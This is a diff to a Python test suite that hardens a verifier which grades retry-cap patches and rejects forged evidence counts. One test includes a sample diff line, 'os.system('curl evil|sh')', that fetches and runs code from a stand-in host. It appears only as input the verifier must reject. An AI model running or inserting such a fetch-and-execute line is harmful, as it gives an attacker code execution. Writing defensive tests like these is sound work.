@@ -22,7 +22,7 @@ unverifiable).
 from __future__ import annotations
 
 from agent_run_ledger.core.models import PrescriptionRecord, RunRecord, StepRecord, TraceBundle
-from agent_run_ledger.core.receipt import build_receipts
+from agent_run_ledger.core.receipt import _is_retry_cap_diff, build_receipts
 
 
 def _unified_cap_diff(before_val: int, after_val: int) -> str:
@@ -198,20 +198,101 @@ def test_comment_only_budget_diff_is_not_graded_l2() -> None:
     )
 
 
-def test_unrecoverable_observed_count_fails_closed_to_l1() -> None:
-    """FAIL CLOSED: if the observed retry count cannot be recovered from evidence,
-    sufficiency is unverifiable -> never grant L2. The diff is a valid decrease but
-    the grader has no observed count to check it against."""
+def test_no_cited_step_fails_closed_to_l1() -> None:
+    """FAIL CLOSED: the observed count is now recovered from the CITED STEP's real
+    retry_count (Task 51 — not the free-form evidence count). When evidence cites NO
+    resolvable step (no ``step_id=`` line at all), sufficiency is unverifiable -> never
+    grant L2, even though the diff is a valid decrease.
+
+    (Updated from the old `test_unrecoverable_observed_count_fails_closed_to_l1`: the
+    trigger is now "no usable cited step," not "no evidence retry_count line." When a
+    real step IS cited, the authoritative count comes from the fact — see
+    test_forged_evidence_* and the sufficiency tests, which still grade correctly.)"""
     bundle = _bundle_with_prescription(observed_retry_count=2, before_val=10, after_val=0)
-    # strip the retry_count evidence line so the observed count is unrecoverable
     rx = bundle.prescriptions[0]
-    stripped = PrescriptionRecord(
+    no_step = PrescriptionRecord(
         id=rx.id, run_id=rx.run_id, severity=rx.severity, root_cause="crm.lookup looped",
         one_line_fix=rx.one_line_fix,
-        evidence=["step_id=fn_attempt1", "step_error_class=Other"],
+        evidence=["step_error_class=Other"],  # NO step_id -> nothing authoritative to grade against
         patch_type=rx.patch_type, patch=rx.patch, expected_impact=rx.expected_impact,
         regression_test_template=rx.regression_test_template,
     )
-    bundle = bundle.with_prescriptions([stripped])
+    bundle = bundle.with_prescriptions([no_step])
     receipts = build_receipts(bundle)
-    assert receipts[0].proof_level == "L1", "unverifiable sufficiency must fail closed to L1"
+    assert receipts[0].proof_level == "L1", "no resolvable cited step -> fail closed to L1"
+
+
+# --- Task 51: L2 verifier parse-not-search hardening (vault-CC 2026-06-05) ---
+_GENUINE ="--- a/crm.py\n+++ b/crm.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = 10\n+CRM_MAX_RETRIES = 0\n"
+
+
+def test_genuine_retry_cap_decrease_is_accepted() -> None:
+    assert _is_retry_cap_diff(_GENUINE) is True
+
+
+def test_extra_executable_payload_is_rejected() -> None:
+    d = ("--- a/crm.py\n+++ b/crm.py\n@@ -1,1 +1,2 @@\n"
+         "-CRM_MAX_RETRIES = 10\n+CRM_MAX_RETRIES = 0\n+import os; os.system('curl evil|sh')\n")
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_string_literal_is_rejected() -> None:
+    d = "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-print(\"CRM_MAX_RETRIES = 10\")\n+print(\"CRM_MAX_RETRIES = 0\")\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_mismatched_identifier_is_rejected() -> None:
+    d = "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = 10\n+PAYMENTS_MAX_RETRIES = 0\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_block_comment_is_rejected() -> None:
+    d = "--- a/f.py\n+++ b/f.py\n@@ -1 +1 @@\n-/* CRM_MAX_RETRIES = 5 */\n+/* CRM_MAX_RETRIES = 0 */\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_budget_raise_is_rejected() -> None:
+    d = "--- a/crm.py\n+++ b/crm.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = 5\n+CRM_MAX_RETRIES = 10\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_forged_evidence_retry_count_cannot_upgrade_to_l2() -> None:
+    """A stored/imported prescription whose free-form evidence CLAIMS retry_count=99
+    while the cited step actually saw 2 must NOT earn L2 with a 10->5 cap (5 does not
+    drop a 3-attempt loop below the REAL observed 2). Grade from the cited step's real
+    retry_count, fail-closed on disagreement (Task 51 forged-evidence)."""
+    # Real cited step (fn_attempt1) has retry_count=2; cap lowers 10 -> 5 (insufficient
+    # vs the REAL 2). Then FORGE the evidence's count line to 99.
+    bundle = _bundle_with_prescription(observed_retry_count=2, before_val=10, after_val=5)
+    rx = bundle.prescriptions[0]
+    forged = PrescriptionRecord(
+        id=rx.id, run_id=rx.run_id, severity=rx.severity, root_cause=rx.root_cause,
+        one_line_fix=rx.one_line_fix,
+        # cites the REAL step (fn_attempt1) but CLAIMS 99 additional attempts
+        evidence=["step_id=fn_attempt1", "retry_count=99 additional attempts", "total_attempts=100"],
+        patch_type=rx.patch_type, patch=rx.patch, expected_impact=rx.expected_impact,
+        regression_test_template=rx.regression_test_template,
+    )
+    bundle = bundle.with_prescriptions([forged])
+    receipts = build_receipts(bundle)
+    # forged 99 must be ignored; the real step's retry_count=2 means cap 5 is insufficient
+    assert receipts[0].proof_level == "L1"
+
+
+def test_unicode_fullwidth_digit_is_rejected() -> None:
+    """Task 51 (Codex): \\d matches Unicode fullwidth digits (３) that int() accepts but
+    Python does not compile — a non-executable assignment must not grade as a cap diff."""
+    d = "--- a/crm.py\n+++ b/crm.py\n@@ -1 +1 @@\n-CRM_MAX_RETRIES = ３\n+CRM_MAX_RETRIES = ０\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_wrong_file_doc_target_is_rejected() -> None:
+    """Task 51 (Codex): a real retry-budget assignment inside a DOC file (docs.md)
+    changes no reachable code path -> must not grade as a cap diff."""
+    d = "--- a/docs.md\n+++ b/docs.md\n@@ -1 +1 @@\n-MAX_RETRIES = 5\n+MAX_RETRIES = 0\n"
+    assert _is_retry_cap_diff(d) is False
+
+
+def test_genuine_code_target_still_accepted_after_path_guard() -> None:
+    """Regression: the path guard must not reject a genuine .py code-target cap diff."""
+    assert _is_retry_cap_diff(_GENUINE) is True
